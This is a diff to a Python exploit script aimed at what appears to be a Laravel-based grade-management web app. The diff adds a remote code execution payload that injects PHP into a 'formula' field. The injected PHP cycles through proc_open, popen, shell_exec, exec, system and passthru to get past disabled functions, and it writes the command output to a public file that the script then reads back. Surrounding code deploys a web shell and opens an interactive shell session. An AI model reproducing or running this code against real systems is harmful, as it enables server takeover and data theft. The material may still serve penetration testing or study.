@@ -96,11 +96,11 @@ POCS = [
         "id":    3,
         "name":  "Direct command execution",
         "color": YELLOW,
-        "desc":  "Runs arbitrary command; redirects output to a web-accessible file",
+        "desc":  "Runs arbitrary command; writes output to a web-accessible file via PHP",
         "extra": [("Command to execute", "whoami"),
-                  ("Output file path",   "c:/laragon/www/es_ldcu/public/output.txt"),
+                  ("Output filename",    "output.txt"),
                   ("Output URL",         "/output.txt")],
-        "cmd":   lambda extra: f'{extra[0]} > {extra[1]}',
+        "cmd":   None,
     },
     {
         "id":    4,
@@ -317,6 +317,70 @@ while True:
         shell_session(BASE_URL, shell_path, SESSION_COOKIE, token=SHELL_TOKEN)
         continue
 
+    # POC 3: direct command execution via PHP functions → file_put_contents
+    if poc["id"] == 3:
+        user_cmd = extra_vals[0] if extra_vals else "whoami"
+        out_file = extra_vals[1] if len(extra_vals) > 1 else "output.txt"
+        out_url  = extra_vals[2] if len(extra_vals) > 2 else "/output.txt"
+
+        # Build PHP that tries all exec functions and writes output to file
+        php_exec = (
+            f"$d=array_map('trim',explode(',',strtolower(ini_get('disable_functions'))));"
+            f"$o='';"
+            f"if(!in_array('proc_open',$d)&&function_exists('proc_open'))"
+            f"{{$p=proc_open('{user_cmd}',[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']],$pp);"
+            f"if(is_resource($p)){{fclose($pp[0]);$o=stream_get_contents($pp[1]).stream_get_contents($pp[2]);"
+            f"fclose($pp[1]);fclose($pp[2]);proc_close($p);}}}}"
+            f"elseif(!in_array('popen',$d)&&function_exists('popen'))"
+            f"{{$h=popen('{user_cmd} 2>&1','r');if($h){{$o=stream_get_contents($h);pclose($h);}}}}"
+            f"elseif(!in_array('shell_exec',$d)&&function_exists('shell_exec'))"
+            f"{{$o=shell_exec('{user_cmd} 2>&1');}}"
+            f"elseif(!in_array('exec',$d)&&function_exists('exec'))"
+            f"{{$l=[];exec('{user_cmd} 2>&1',$l);$o=implode(\"\\n\",$l);}}"
+            f"elseif(!in_array('system',$d)&&function_exists('system'))"
+            f"{{ob_start();system('{user_cmd} 2>&1');$o=ob_get_clean();}}"
+            f"elseif(!in_array('passthru',$d)&&function_exists('passthru'))"
+            f"{{ob_start();passthru('{user_cmd} 2>&1');$o=ob_get_clean();}}"
+            f"else{{$o='ALL_EXEC_DISABLED: '.ini_get('disable_functions');}}"
+            f"file_put_contents('{out_file}',$o);"
+        )
+        formula = f"$x=$prelim;{php_exec}"
+        payload = {"formula": formula, "prelim": "30", "midterm": "30",
+                   "prefi": "20", "final": "20", "isPointScaled": "0", "passingRate": "75"}
+        endpoint = f"{BASE_URL}/semester-setup/add"
+        headers_req = {"Cookie": _cookie_header(SESSION_COOKIE)}
+
+        print(f"  {DIM}[>]{RESET} {CYAN}{METHOD.upper()}{RESET} {endpoint}")
+        print(f"  {DIM}[>]{RESET} cmd: {YELLOW}{user_cmd}{RESET} → {CYAN}{out_file}{RESET}\n")
+
+        try:
+            if METHOD.upper() == "GET":
+                r = requests.get(endpoint, params=payload, headers=headers_req, timeout=10)
+            else:
+                h = {**headers_req, "Content-Type": "application/json"}
+                r = requests.request(METHOD.upper(), endpoint, headers=h,
+                                     data=json.dumps(payload), timeout=10)
+
+            sc = GREEN if r.status_code < 300 else YELLOW if r.status_code < 500 else RED
+            print(f"  {DIM}[<]{RESET} inject status {sc}{r.status_code}{RESET}")
+
+            # Try to read the output file
+            read_url = f"{BASE_URL}{out_url}"
+            print(f"  {DIM}[>]{RESET} reading {CYAN}{read_url}{RESET}")
+            rr = requests.get(read_url, headers={"Cookie": _cookie_header(SESSION_COOKIE)}, timeout=6)
+            if rr.status_code == 200:
+                print(f"  {GREEN}[✓]{RESET} Output:\n")
+                for line in rr.text.splitlines():
+                    print(f"  {DIM}│{RESET}  {line}")
+                if "ALL_EXEC_DISABLED" in rr.text:
+                    print(f"\n  {RED}[!]{RESET} All exec functions are disabled on target.")
+            else:
+                print(f"  {RED}[✗]{RESET} Could not read output ({rr.status_code})")
+        except Exception as e:
+            print(f"  {RED}[!]{RESET} {e}")
+        print()
+        continue
+
     # POC 5: deploy custom execveil shell via file_put_contents
     if poc["id"] == 5:
         shell_filename = extra_vals[0].lstrip("/") if extra_vals else "ev.php"
@@ -386,7 +450,12 @@ while True:
                     )
                     if "evshell_ok" in ping.text:
                         print(f"  {GREEN}[✓]{RESET} Shell is {GREEN}{BOLD}LIVE{RESET}")
-                        drop = "y"
+                        try:
+                            drop = input(f"  {CYAN}[?]{RESET} Drop into shell session? [Y/n]: ").strip().lower()
+                            if drop == '' or drop == 'y':
+                                drop = 'y'
+                        except (KeyboardInterrupt, EOFError):
+                            drop = 'n'
                     elif ping.status_code == 404:
                         raw = ping.text[:120].replace("\n"," ").strip()
                         # distinguish our custom 404 vs Laravel 404
